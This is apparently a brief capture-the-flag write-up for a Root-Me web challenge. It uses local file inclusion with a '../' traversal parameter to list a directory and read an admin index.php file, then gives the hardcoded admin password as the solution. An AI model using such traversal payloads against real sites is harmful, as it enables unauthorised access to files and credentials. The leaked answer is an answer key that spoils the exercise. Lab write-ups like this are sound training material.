# Analysis
We must search admin page/directory via LFI (Local file Inclusion).
http://challenge01.root-me.org/web-serveur/ch16/?files=../

# Attack Execution
The directory is listing our admin directory, now view the content of file index.php with File viewer.
http://challenge01.root-me.org/web-serveur/ch16/?files=../admin&f=index.php

Search for this string: 
$users = array('admin' => 'OpbNJ60xYpvAQU8');
